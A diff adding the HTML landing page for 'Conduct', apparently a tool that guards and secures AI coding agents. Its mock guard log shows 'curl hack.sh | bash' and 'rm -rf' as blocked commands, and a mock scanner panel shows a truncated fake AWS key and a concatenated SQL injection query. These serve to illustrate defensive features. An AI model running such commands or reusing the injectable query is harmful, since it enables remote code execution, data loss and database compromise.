@@ -1,0 +1,938 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Conduct — Govern. Secure. Automate.</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --indigo: #4F46E5;
+      --violet: #7C3AED;
+      --sky:    #0284C7;
+      --stone-50:  #FAFAF9;
+      --stone-100: #F5F5F4;
+      --stone-200: #E7E5E4;
+      --stone-400: #A8A29E;
+      --stone-500: #78716C;
+      --stone-700: #44403C;
+      --stone-900: #1C1917;
+      --ink:       #0C0A09;
+    }
+
+    body {
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+      background: white;
+      color: var(--stone-900);
+    }
+
+    /* ── NAV ── */
+    nav {
+      display: flex; align-items: center; justify-content: space-between;
+      padding: 1.125rem 2.5rem;
+      border-bottom: 1px solid var(--stone-200);
+      position: sticky; top: 0;
+      background: rgba(255,255,255,0.92);
+      backdrop-filter: blur(8px);
+      z-index: 10;
+    }
+    .nav-logo {
+      font-size: 1rem; font-weight: 800;
+      color: var(--ink); letter-spacing: -0.02em;
+      display: flex; align-items: center; gap: 0.5rem;
+    }
+    .nav-logo-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--indigo); }
+    .nav-links { display: flex; gap: 1.75rem; list-style: none; }
+    .nav-links a {
+      font-size: 0.875rem; font-weight: 500;
+      color: var(--stone-500); text-decoration: none; transition: color 0.15s;
+    }
+    .nav-links a:hover { color: var(--ink); }
+    .nav-cta {
+      font-size: 0.875rem; font-weight: 600;
+      background: var(--indigo); color: white;
+      border: none; border-radius: 9px;
+      padding: 0.5rem 1.125rem;
+      cursor: pointer; font-family: inherit; transition: background 0.15s;
+    }
+    .nav-cta:hover { background: #4338CA; }
+
+    /* ── SHARED ── */
+    .section-inner { max-width: 960px; margin: 0 auto; }
+    .section-label {
+      font-size: 0.6875rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 0.1em;
+      color: var(--stone-400); margin-bottom: 0.875rem;
+    }
+    .section-title {
+      font-size: 2rem; font-weight: 800;
+      color: var(--ink); letter-spacing: -0.03em;
+      line-height: 1.15; margin-bottom: 1rem;
+    }
+    .section-sub {
+      font-size: 1rem; color: var(--stone-500);
+      line-height: 1.65; max-width: 520px;
+    }
+
+    /* ── HERO (B: SPLIT) ── */
+    #hero { background: var(--stone-50); padding: 4.5rem 2.5rem 5rem; }
+    .hero-grid {
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 5rem; align-items: start;
+    }
+    .hero-left { display: flex; flex-direction: column; gap: 2.25rem; padding-top: 0.75rem; }
+    .headline h1 {
+      font-size: 2.875rem; font-weight: 800;
+      line-height: 1.1; color: var(--ink); letter-spacing: -0.035em;
+      margin-bottom: 0.75rem;
+    }
+    .headline p { font-size: 1rem; color: var(--stone-400); line-height: 1.65; }
+    .c-govern   { color: var(--indigo); }
+    .c-secure   { color: var(--violet); }
+    .c-automate { color: var(--sky); }
+    .hero-ctas { display: flex; gap: 0.75rem; align-items: center; }
+    .cta-primary {
+      background: var(--indigo); color: white; border: none; border-radius: 10px;
+      padding: 0.625rem 1.375rem; font-size: 0.9375rem; font-weight: 600;
+      cursor: pointer; font-family: inherit; transition: background 0.15s;
+    }
+    .cta-primary:hover { background: #4338CA; }
+    .cta-secondary {
+      color: var(--stone-500); font-size: 0.9375rem; font-weight: 500;
+      text-decoration: none; transition: color 0.15s;
+    }
+    .cta-secondary:hover { color: var(--ink); }
+    .logo-strip { display: flex; flex-direction: column; gap: 0.75rem; }
+    .logo-strip-label {
+      font-size: 0.6875rem; font-weight: 500;
+      text-transform: uppercase; letter-spacing: 0.08em; color: var(--stone-400);
+    }
+    .logo-strip-row { display: flex; align-items: center; gap: 1.25rem; }
+    .logo-box { height: 18px; background: var(--stone-200); border-radius: 3px; opacity: 0.65; }
+
+    /* ── HERO RIGHT ── */
+    .hero-right { display: flex; flex-direction: column; gap: 0.875rem; }
+
+    /* ── INTENT BOX ── */
+    .intent-box {
+      display: flex; align-items: center;
+      background: white; border: 1.5px solid var(--stone-200);
+      border-radius: 14px; padding: 0.625rem 0.625rem 0.625rem 1.25rem;
+      gap: 0.625rem; box-shadow: 0 1px 4px rgba(0,0,0,0.05);
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .intent-box.focused { border-color: #C7D2FE; box-shadow: 0 0 0 3px rgba(79,70,229,0.07); }
+    .intent-input {
+      flex: 1; border: none; outline: none;
+      font-size: 0.9375rem; font-family: inherit;
+      color: var(--stone-900); background: transparent;
+      caret-color: var(--indigo); min-width: 0;
+    }
+    .intent-input::placeholder { color: #C4BFBB; }
+    .intent-btn {
+      width: 34px; height: 34px; border-radius: 9px;
+      background: var(--indigo); border: none; cursor: pointer;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0; transition: background 0.15s;
+    }
+    .intent-btn:hover { background: #4338CA; }
+
+    /* ── RULE CARD ── */
+    .rule-card {
+      background: white; border: 1.5px solid var(--stone-200);
+      border-radius: 20px; padding: 1.5rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.06);
+      min-height: 188px;
+      transition: opacity 0.25s ease, transform 0.25s ease,
+                  border-color 0.4s ease, box-shadow 0.4s ease;
+    }
+    .rule-card.dim     { opacity: 0.1; transform: translateY(6px); }
+    .rule-card.activated { border-color: #86EFAC; box-shadow: 0 4px 24px rgba(34,197,94,0.1); }
+    .card-header { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 0.5rem; }
+    .card-icon {
+      width: 26px; height: 26px; border-radius: 7px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.8125rem; flex-shrink: 0;
+    }
+    .icon-guard    { background: #EEF2FF; }
+    .icon-secure   { background: #F5F3FF; }
+    .icon-automate { background: #EFF6FF; }
+    .card-lens-name { font-size: 0.9375rem; font-weight: 700; }
+    .card-lens-q    { font-size: 0.875rem; color: var(--stone-400); }
+    .card-example   { font-size: 0.9375rem; color: var(--stone-700); font-style: italic; margin-bottom: 1rem; line-height: 1.5; }
+    .card-chips     { display: flex; gap: 0.4375rem; flex-wrap: wrap; margin-bottom: 1rem; }
+    .card-chip {
+      font-size: 0.8rem; color: var(--stone-700);
+      background: var(--stone-100); border: 1px solid var(--stone-200);
+      border-radius: 20px; padding: 0.275rem 0.7rem;
+      opacity: 0; transform: translateY(5px);
+      transition: opacity 0.2s ease, transform 0.2s ease;
+    }
+    .card-chip.show   { opacity: 1; transform: translateY(0); }
+    .card-chip.danger { color: #DC2626; background: #FEF2F2; border-color: #FECACA; }
+    .card-chip.warn   { color: #D97706; background: #FFFBEB; border-color: #FDE68A; }
+    .card-footer { display: flex; align-items: center; justify-content: space-between; gap: 0.5rem; }
+    .card-stat { font-size: 0.875rem; color: var(--indigo); font-weight: 500; opacity: 0; transition: opacity 0.3s ease; }
+    .card-stat.show { opacity: 1; }
+    .confirm-btn {
+      font-size: 0.875rem; font-weight: 600; color: var(--stone-900);
+      background: white; border: 1.5px solid #D6D3D1; border-radius: 10px;
+      padding: 0.375rem 1rem; cursor: pointer; font-family: inherit;
+      opacity: 0; transform: scale(0.94); white-space: nowrap; flex-shrink: 0;
+      transition: opacity 0.2s, transform 0.2s, background 0.2s,
+                  border-color 0.2s, color 0.2s, box-shadow 0.2s;
+    }
+    .confirm-btn.show  { opacity: 1; transform: scale(1); }
+    .confirm-btn.pulse { animation: btn-pulse 0.7s ease infinite alternate; }
+    .confirm-btn.done  { background: #22C55E; border-color: #22C55E; color: white; animation: none; }
+    @keyframes btn-pulse {
+      from { box-shadow: 0 0 0 0 rgba(79,70,229,0.2); border-color: #C7D2FE; }
+      to   { box-shadow: 0 0 0 5px rgba(79,70,229,0); border-color: #818CF8; }
+    }
+    .active-badge {
+      display: none; align-items: center; gap: 0.3rem;
+      font-size: 0.8rem; font-weight: 600; color: #16A34A;
+      background: #F0FDF4; border: 1px solid #BBF7D0;
+      border-radius: 20px; padding: 0.275rem 0.7rem;
+    }
+    .active-badge.show { display: flex; }
+
+    /* ── INTEGRATIONS STRIP ── */
+    #integrations {
+      padding: 1.75rem 2.5rem;
+      border-top: 1px solid var(--stone-200);
+      border-bottom: 1px solid var(--stone-200);
+    }
+    .integrations-inner {
+      display: flex; align-items: center; gap: 2rem;
+    }
+    .integrations-label {
+      font-size: 0.6875rem; font-weight: 600;
+      text-transform: uppercase; letter-spacing: 0.08em;
+      color: var(--stone-400); flex-shrink: 0; white-space: nowrap;
+    }
+    .int-list { display: flex; align-items: center; gap: 0.5rem; flex-wrap: wrap; }
+    .int-pill {
+      display: flex; align-items: center; gap: 0.375rem;
+      border: 1px solid var(--stone-200); border-radius: 99px;
+      padding: 0.3rem 0.875rem; transition: border-color 0.15s;
+    }
+    .int-pill:hover { border-color: var(--stone-400); }
+    .int-dot { width: 6px; height: 6px; border-radius: 50%; flex-shrink: 0; }
+    .int-name { font-size: 0.8125rem; font-weight: 500; color: var(--stone-700); }
+
+    /* ── HOW IT WORKS ── */
+    #how { background: var(--stone-50); padding: 5.5rem 2.5rem; }
+    .steps {
+      display: grid; grid-template-columns: repeat(4, 1fr);
+      margin-top: 3rem; position: relative;
+    }
+    .steps::before {
+      content: ''; position: absolute; top: 22px;
+      left: calc(12.5% + 16px); right: calc(12.5% + 16px);
+      height: 1px; background: var(--stone-200);
+    }
+    .step { display: flex; flex-direction: column; align-items: center; text-align: center; padding: 0 1rem; }
+    .step-num {
+      width: 44px; height: 44px; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.8125rem; font-weight: 700;
+      background: white; border: 1.5px solid var(--stone-200);
+      color: var(--stone-500); margin-bottom: 1rem;
+      position: relative; z-index: 1; transition: border-color 0.2s, color 0.2s;
+    }
+    .step:hover .step-num { border-color: var(--indigo); color: var(--indigo); }
+    .step-title { font-size: 0.9375rem; font-weight: 700; color: var(--ink); margin-bottom: 0.375rem; white-space: nowrap; }
+    .step-desc  { font-size: 0.8125rem; color: var(--stone-500); line-height: 1.55; }
+
+    /* ── SPOTLIGHT (F) ── */
+    #spotlight { padding: 1rem 2.5rem 5.5rem; }
+    .spotlight-row {
+      display: flex; gap: 5rem; align-items: center;
+      padding: 5rem 0;
+    }
+    .spotlight-row + .spotlight-row { border-top: 1px solid var(--stone-200); }
+    .spotlight-row.flip { flex-direction: row-reverse; }
+    .spotlight-visual { flex: 1; min-width: 0; }
+    .spotlight-text {
+      flex: 1; min-width: 0;
+      display: flex; flex-direction: column; gap: 1.125rem;
+    }
+    .spotlight-text h2 {
+      font-size: 1.625rem; font-weight: 800;
+      color: var(--ink); letter-spacing: -0.025em; line-height: 1.2;
+    }
+    .spotlight-text p {
+      font-size: 0.9375rem; color: var(--stone-500); line-height: 1.7;
+    }
+    .spotlight-chips { display: flex; gap: 0.4375rem; flex-wrap: wrap; }
+    .schip {
+      display: inline-flex; align-items: center;
+      font-size: 0.8125rem; font-weight: 500;
+      border-radius: 20px; padding: 0.3rem 0.75rem;
+    }
+    .schip.ok      { color: #16A34A; background: #F0FDF4; border: 1px solid #BBF7D0; }
+    .schip.danger  { color: #DC2626; background: #FEF2F2; border: 1px solid #FECACA; }
+    .schip.warn    { color: #D97706; background: #FFFBEB; border: 1px solid #FDE68A; }
+    .schip.neutral { color: var(--stone-500); background: var(--stone-100); border: 1px solid var(--stone-200); }
+
+    /* ── GUARD MINI-UI ── */
+    .guard-ui {
+      background: var(--stone-900); border-radius: 14px;
+      padding: 1.125rem 1.25rem; user-select: none;
+    }
+    .gui-header {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 1rem;
+    }
+    .gui-title { font-size: 0.8125rem; font-weight: 600; color: #E2E8F0; }
+    .live-ind  { display: flex; align-items: center; gap: 5px; font-size: 0.6875rem; font-weight: 500; color: #4ADE80; }
+    .live-dot  { width: 6px; height: 6px; border-radius: 50%; background: #4ADE80; animation: lp 1.6s ease infinite; }
+    @keyframes lp { 0%,100%{opacity:1} 50%{opacity:0.35} }
+    .guard-event {
+      display: grid; grid-template-columns: 58px 34px 1fr auto;
+      align-items: center; gap: 0.625rem;
+      padding: 0.5rem 0; border-bottom: 1px solid rgba(255,255,255,0.05);
+    }
+    .guard-event:last-of-type { border-bottom: none; }
+    .gbadge {
+      font-size: 0.625rem; font-weight: 700; letter-spacing: 0.04em;
+      padding: 2px 0; border-radius: 4px; text-align: center;
+    }
+    .gbadge.blocked { background: #DC2626; color: white; }
+    .gbadge.allowed { background: rgba(74,222,128,0.15); color: #4ADE80; }
+    .g-time { font-size: 0.625rem; color: #4B5563; }
+    .g-cmd  { font-family: monospace; font-size: 0.75rem; color: #E2E8F0; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+    .g-meta { font-size: 0.625rem; color: #6B7280; }
+    .gui-footer {
+      margin-top: 0.875rem; padding-top: 0.875rem;
+      border-top: 1px solid rgba(255,255,255,0.05);
+      font-size: 0.75rem; color: #6B7280;
+      display: flex; gap: 1.5rem;
+    }
+    .gui-footer strong { color: #4ADE80; }
+
+    /* ── SECURE MINI-UI ── */
+    .secure-ui {
+      background: white; border: 1.5px solid var(--stone-200);
+      border-radius: 14px; padding: 1.125rem 1.25rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.05); user-select: none;
+    }
+    .sui-pr {
+      display: flex; align-items: center; gap: 0.5rem;
+      margin-bottom: 0.875rem; padding-bottom: 0.875rem;
+      border-bottom: 1px solid var(--stone-100);
+    }
+    .sui-pr-num { font-size: 0.8125rem; font-weight: 700; color: var(--ink); }
+    .sui-pr-arrow { font-size: 0.75rem; color: var(--stone-400); }
+    .sui-pr-branch { font-size: 0.75rem; color: var(--stone-400); font-family: monospace; }
+    .sui-findings-label { font-size: 0.75rem; font-weight: 600; color: var(--stone-500); margin-bottom: 0.625rem; }
+    .sui-finding {
+      border: 1px solid var(--stone-200); border-radius: 9px;
+      padding: 0.625rem 0.75rem; margin-bottom: 0.5rem;
+    }
+    .sui-finding:last-of-type { margin-bottom: 0; }
+    .sui-finding-top { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 4px; }
+    .sui-finding-name { font-size: 0.8125rem; font-weight: 600; color: var(--ink); }
+    .sui-sev {
+      font-size: 0.625rem; font-weight: 700; letter-spacing: 0.03em;
+      padding: 1px 6px; border-radius: 3px; flex-shrink: 0;
+    }
+    .sui-sev.high   { background: #FEF2F2; color: #DC2626; }
+    .sui-sev.medium { background: #FFFBEB; color: #D97706; }
+    .sui-loc  { font-family: monospace; font-size: 0.75rem; color: var(--stone-400); margin-bottom: 4px; }
+    .sui-code {
+      font-family: monospace; font-size: 0.75rem; color: var(--stone-700);
+      background: var(--stone-100); border-radius: 4px; padding: 3px 7px;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+    .sui-actions { display: flex; gap: 0.5rem; margin-top: 0.875rem; padding-top: 0.875rem; border-top: 1px solid var(--stone-100); }
+    .sui-btn {
+      font-size: 0.8125rem; font-weight: 600; border-radius: 8px;
+      padding: 0.375rem 0.875rem; cursor: pointer; font-family: inherit; border: none;
+    }
+    .sui-btn.primary { background: var(--indigo); color: white; }
+    .sui-btn.ghost   { background: white; color: var(--stone-500); border: 1px solid var(--stone-200); }
+
+    /* ── AUTOMATE MINI-UI ── */
+    .automate-ui {
+      background: white; border: 1.5px solid var(--stone-200);
+      border-radius: 14px; padding: 1.125rem 1.25rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.05); user-select: none;
+    }
+    .aui-header {
+      display: flex; align-items: center; justify-content: space-between;
+      margin-bottom: 1rem; padding-bottom: 0.875rem;
+      border-bottom: 1px solid var(--stone-100);
+    }
+    .aui-title { font-size: 0.8125rem; font-weight: 700; color: var(--ink); }
+    .aui-count { font-size: 0.75rem; color: var(--stone-400); }
+    .aui-pb {
+      display: flex; align-items: center; gap: 0.75rem;
+      padding: 0.5625rem 0; border-bottom: 1px solid var(--stone-100);
+    }
+    .aui-pb:last-of-type { border-bottom: none; }
+    .aui-dot {
+      width: 18px; height: 18px; border-radius: 50%; flex-shrink: 0;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 0.6rem; font-weight: 700;
+    }
+    .aui-dot.on  { background: #F0FDF4; color: #16A34A; border: 1.5px solid #BBF7D0; }
+    .aui-dot.off { background: var(--stone-100); color: var(--stone-400); border: 1.5px solid var(--stone-200); }
+    .aui-name { flex: 1; font-size: 0.8125rem; font-weight: 600; color: var(--ink); }
+    .aui-tag  {
+      font-size: 0.6875rem; color: var(--stone-400);
+      background: var(--stone-100); border-radius: 20px; padding: 2px 8px;
+    }
+    .aui-footer { margin-top: 0.875rem; }
+    .aui-browse { font-size: 0.8125rem; font-weight: 600; color: var(--indigo); text-decoration: none; }
+    .aui-browse:hover { color: #4338CA; }
+
+    /* ── INSTALL ── */
+    #install { background: var(--stone-50); padding: 5.5rem 2.5rem; text-align: center; }
+    #install .section-inner { display: flex; flex-direction: column; align-items: center; gap: 1.25rem; }
+    #install .section-sub   { text-align: center; }
+    .install-box {
+      display: flex; align-items: center; gap: 0.75rem;
+      background: var(--stone-900); border-radius: 12px;
+      padding: 0.875rem 1.25rem; box-shadow: 0 4px 20px rgba(0,0,0,0.12);
+    }
+    .install-prompt { color: #6EE7B7; font-family: monospace; font-size: 0.875rem; user-select: none; }
+    .install-cmd    { color: #E2E8F0; font-family: monospace; font-size: 0.875rem; }
+    .copy-btn {
+      background: none; border: 1px solid #374151; border-radius: 6px;
+      color: #9CA3AF; font-size: 0.7rem; font-weight: 500;
+      padding: 0.25rem 0.6rem; cursor: pointer; font-family: inherit;
+      transition: border-color 0.15s, color 0.15s;
+    }
+    .copy-btn:hover { border-color: #6B7280; color: #E2E8F0; }
+    .install-links { display: flex; gap: 1rem; align-items: center; }
+    .gh-link {
+      display: flex; align-items: center; gap: 0.375rem;
+      font-size: 0.875rem; font-weight: 500; color: var(--stone-500);
+      text-decoration: none; transition: color 0.15s;
+    }
+    .gh-link:hover { color: var(--ink); }
+
+    /* ── FINAL CTA ── */
+    #final-cta { background: var(--ink); padding: 6rem 2.5rem; text-align: center; }
+    #final-cta .section-inner { display: flex; flex-direction: column; align-items: center; gap: 1.5rem; }
+    #final-cta .section-title { color: white; font-size: 2.25rem; }
+    #final-cta .section-sub   { color: var(--stone-400); text-align: center; }
+    .final-btns { display: flex; gap: 0.75rem; align-items: center; }
+    .btn-white {
+      background: white; color: var(--ink); border: none; border-radius: 10px;
+      padding: 0.75rem 1.5rem; font-size: 0.9375rem; font-weight: 600;
+      cursor: pointer; font-family: inherit; transition: background 0.15s;
+    }
+    .btn-white:hover { background: #F5F5F4; }
+    .btn-ghost {
+      background: none; color: #A8A29E; border: 1px solid #374151; border-radius: 10px;
+      padding: 0.75rem 1.5rem; font-size: 0.9375rem; font-weight: 500;
+      cursor: pointer; font-family: inherit; transition: border-color 0.15s, color 0.15s;
+    }
+    .btn-ghost:hover { border-color: #6B7280; color: white; }
+    .early-note { font-size: 0.8rem; color: #6B7280; }
+
+    /* ── FOOTER ── */
+    footer {
+      border-top: 1px solid #1F2937; background: var(--ink);
+      padding: 2rem 2.5rem; display: flex;
+      align-items: center; justify-content: space-between;
+    }
+    .footer-logo { font-size: 0.875rem; font-weight: 700; color: #4B5563; }
+    .footer-links { display: flex; gap: 1.5rem; }
+    .footer-links a { font-size: 0.8rem; color: #4B5563; text-decoration: none; transition: color 0.15s; }
+    .footer-links a:hover { color: #9CA3AF; }
+  </style>
+</head>
+<body>
+
+<!-- ── NAV ── -->
+<nav>
+  <div class="nav-logo"><div class="nav-logo-dot"></div>Conduct</div>
+  <ul class="nav-links">
+    <li><a href="#">Playbooks</a></li>
+    <li><a href="#">Guard</a></li>
+    <li><a href="#">Docs</a></li>
+    <li><a href="#">GitHub</a></li>
+  </ul>
+  <button class="nav-cta">Start free</button>
+</nav>
+
+<!-- ── HERO (B: SPLIT LAYOUT) ── -->
+<section id="hero">
+  <div class="section-inner hero-grid">
+
+    <!-- Left: always-on content -->
+    <div class="hero-left">
+      <div class="headline">
+        <h1><span class="c-govern">Govern.</span> <span class="c-secure">Secure.</span> <span class="c-automate">Automate.</span></h1>
+        <p>The operating layer for AI-assisted engineering teams. From intent to active rule in under two minutes.</p>
+      </div>
+      <div class="hero-ctas">
+        <button class="cta-primary">Start free</button>
+        <a class="cta-secondary" href="#">See the playbooks →</a>
+      </div>
+      <div class="logo-strip">
+        <div class="logo-strip-label">Trusted by teams at</div>
+        <div class="logo-strip-row">
+          <div class="logo-box" style="width:54px"></div>
+          <div class="logo-box" style="width:42px"></div>
+          <div class="logo-box" style="width:60px"></div>
+          <div class="logo-box" style="width:46px"></div>
+          <div class="logo-box" style="width:38px"></div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Right: live demo -->
+    <div class="hero-right">
+      <div class="intent-box" id="intentBox">
+        <input class="intent-input" id="intentInput" type="text" placeholder="What do you want to govern, secure, or automate?" readonly>
+        <button class="intent-btn">
+          <svg width="14" height="14" viewBox="0 0 14 14" fill="none">
+            <path d="M1 7H13M7 1L13 7L7 13" stroke="white" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>
+        </button>
+      </div>
+      <div class="rule-card" id="ruleCard">
+        <div class="card-header">
+          <div class="card-icon" id="cardIcon"></div>
+          <span class="card-lens-name" id="cardName"></span>
+          <span class="card-lens-q"    id="cardQ"></span>
+        </div>
+        <div class="card-example" id="cardExample"></div>
+        <div class="card-chips"   id="cardChips"></div>
+        <div class="card-footer">
+          <div class="card-stat" id="cardStat"></div>
+          <div style="display:flex; align-items:center; gap:0.5rem;">
+            <div class="active-badge" id="activeBadge">
+              <svg width="11" height="11" viewBox="0 0 11 11" fill="none">
+                <path d="M1.5 5.5L4.5 8.5L9.5 2.5" stroke="#16A34A" stroke-width="1.75" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+              Active
+            </div>
+            <button class="confirm-btn" id="confirmBtn">Confirm</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ── INTEGRATIONS STRIP ── -->
+<section id="integrations">
+  <div class="section-inner">
+    <div class="integrations-inner">
+      <div class="integrations-label">Works with</div>
+      <div class="int-list">
+        <div class="int-pill"><div class="int-dot" style="background:#1F2937"></div><span class="int-name">GitHub</span></div>
+        <div class="int-pill"><div class="int-dot" style="background:#E01E5A"></div><span class="int-name">Slack</span></div>
+        <div class="int-pill"><div class="int-dot" style="background:#06AC38"></div><span class="int-name">PagerDuty</span></div>
+        <div class="int-pill"><div class="int-dot" style="background:#4F46E5"></div><span class="int-name">GitHub Actions</span></div>
+        <div class="int-pill"><div class="int-dot" style="background:#5E6AD2"></div><span class="int-name">Linear</span></div>
+        <div class="int-pill"><div class="int-dot" style="background:#0052CC"></div><span class="int-name">Jira</span></div>
+        <div class="int-pill"><div class="int-dot" style="background:#FF5630"></div><span class="int-name">Datadog</span></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ── HOW IT WORKS ── -->
+<section id="how">
+  <div class="section-inner">
+    <div class="section-label">How it works</div>
+    <div class="section-title">From intent to active rule<br>in under two minutes.</div>
+    <div class="steps">
+      <div class="step">
+        <div class="step-num">1</div>
+        <div class="step-title">Intent</div>
+        <div class="step-desc">Describe what you want in plain English. No YAML, no config files.</div>
+      </div>
+      <div class="step">
+        <div class="step-num">2</div>
+        <div class="step-title">Propose</div>
+        <div class="step-desc">Conduct generates a rule pre-wired to your trigger, condition, and response.</div>
+      </div>
+      <div class="step">
+        <div class="step-num">3</div>
+        <div class="step-title">Test run</div>
+        <div class="step-desc">See how the rule would have fired on your real history before you arm it.</div>
+      </div>
+      <div class="step">
+        <div class="step-num">4</div>
+        <div class="step-title">Activate</div>
+        <div class="step-desc">One click. Live, governed, logged, and adjustable from the dashboard.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ── SPOTLIGHT SECTION (F) ── -->
+<section id="spotlight">
+  <div class="section-inner">
+
+    <!-- Guard -->
+    <div class="spotlight-row">
+      <div class="spotlight-visual">
+        <div class="guard-ui">
+          <div class="gui-header">
+            <div class="gui-title">Guard Activity</div>
+            <div class="live-ind"><div class="live-dot"></div>Live</div>
+          </div>
+          <div class="guard-event">
+            <span class="gbadge blocked">BLOCKED</span>
+            <span class="g-time">09:14</span>
+            <span class="g-cmd">rm -rf /tmp/build</span>
+            <span class="g-meta">bash</span>
+          </div>
+          <div class="guard-event">
+            <span class="gbadge blocked">BLOCKED</span>
+            <span class="g-time">09:12</span>
+            <span class="g-cmd">curl hack.sh | bash</span>
+            <span class="g-meta">bash</span>
+          </div>
+          <div class="guard-event">
+            <span class="gbadge allowed">ALLOWED</span>
+            <span class="g-time">09:08</span>
+            <span class="g-cmd">npm ci</span>
+            <span class="g-meta">bash</span>
+          </div>
+          <div class="guard-event">
+            <span class="gbadge allowed">ALLOWED</span>
+            <span class="g-time">09:04</span>
+            <span class="g-cmd">git status --short</span>
+            <span class="g-meta">bash</span>
+          </div>
+          <div class="gui-footer">
+            <span><strong>2</strong> blocked</span>
+            <span>38 allowed</span>
+            <span>today</span>
+          </div>
+        </div>
+      </div>
+      <div class="spotlight-text">
+        <div class="section-label">Guard</div>
+        <h2>Stop AI from doing what it shouldn't.</h2>
+        <p>Set guardrails on tool calls, file writes, and shell commands. Rules go live in seconds. Every block is logged with full context — what fired, why, and what the agent was trying to do.</p>
+        <div class="spotlight-chips">
+          <span class="schip ok">✓ bash · block rm -rf</span>
+          <span class="schip ok">✓ file-write · /etc/</span>
+          <span class="schip neutral">+ any tool call</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Secure -->
+    <div class="spotlight-row flip">
+      <div class="spotlight-visual">
+        <div class="secure-ui">
+          <div class="sui-pr">
+            <span class="sui-pr-num">PR #247</span>
+            <span class="sui-pr-arrow">·</span>
+            <span class="sui-pr-branch">feat/user-auth → main</span>
+          </div>
+          <div class="sui-findings-label">2 security findings</div>
+          <div class="sui-finding">
+            <div class="sui-finding-top">
+              <span class="sui-finding-name">hardcoded-secret</span>
+              <span class="sui-sev high">HIGH</span>
+            </div>
+            <div class="sui-loc">src/config.js:14</div>
+            <div class="sui-code">AWS_SECRET_KEY = "AKIA3GVN8..."</div>
+          </div>
+          <div class="sui-finding">
+            <div class="sui-finding-top">
+              <span class="sui-finding-name">sql-injection</span>
+              <span class="sui-sev medium">MEDIUM</span>
+            </div>
+            <div class="sui-loc">api/users.js:89</div>
+            <div class="sui-code">query = "SELECT * WHERE id="+userId</div>
+          </div>
+          <div class="sui-actions">
+            <button class="sui-btn primary">Open fix PR ↗</button>
+            <button class="sui-btn ghost">Dismiss</button>
+          </div>
+        </div>
+      </div>
+      <div class="spotlight-text">
+        <div class="section-label">Secure</div>
+        <h2>Catch issues before they merge.</h2>
+        <p>Secret detection, SQL injection, and OWASP checks run on every PR automatically. Findings post inline to the PR — with a fix branch pre-generated and ready to merge.</p>
+        <div class="spotlight-chips">
+          <span class="schip danger">hardcoded secrets</span>
+          <span class="schip warn">SQL injection</span>
+          <span class="schip warn">OWASP Top 10</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Automate -->
+    <div class="spotlight-row">
+      <div class="spotlight-visual">
+        <div class="automate-ui">
+          <div class="aui-header">
+            <div class="aui-title">Installed Playbooks</div>
+            <div class="aui-count">4 of 22 active</div>
+          </div>
+          <div class="aui-pb">
+            <div class="aui-dot on">✓</div>
+            <div class="aui-name">Issue Triage</div>
+            <div class="aui-tag">GitHub</div>
+          </div>
+          <div class="aui-pb">
+            <div class="aui-dot on">✓</div>
+            <div class="aui-name">PR Summarizer</div>
+            <div class="aui-tag">GitHub · Slack</div>
+          </div>
+          <div class="aui-pb">
+            <div class="aui-dot on">✓</div>
+            <div class="aui-name">Deploy Guard</div>
+            <div class="aui-tag">Guard</div>
+          </div>
+          <div class="aui-pb">
+            <div class="aui-dot off">○</div>
+            <div class="aui-name">Secret Scanner</div>
+            <div class="aui-tag">Security</div>
+          </div>
+          <div class="aui-footer">
+            <a class="aui-browse" href="#">Browse all 22 playbooks →</a>
+          </div>
+        </div>
+      </div>
+      <div class="spotlight-text">
+        <div class="section-label">Automate</div>
+        <h2>22 playbooks. Ready on day one.</h2>
+        <p>Issue triage, PR summaries, standup digests, incident response — installed in one click, configured with intent. No YAML, no boilerplate. Works with the tools your team already uses.</p>
+        <div class="spotlight-chips">
+          <span class="schip neutral">GitHub</span>
+          <span class="schip neutral">Slack</span>
+          <span class="schip neutral">PagerDuty</span>
+          <span class="schip neutral">GitHub Actions</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ── INSTALL ── -->
+<section id="install">
+  <div class="section-inner">
+    <div class="section-label">Developer-first</div>
+    <div class="section-title">Self-serve. No demo required.</div>
+    <div class="section-sub">Install the CLI, connect your first integration, and have your first rule active in under five minutes.</div>
+    <div class="install-box">
+      <span class="install-prompt">$</span>
+      <span class="install-cmd">pip install conduct</span>
+      <button class="copy-btn" onclick="copyInstall()">copy</button>
+    </div>
+    <div class="install-links">
+      <a class="gh-link" href="#">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
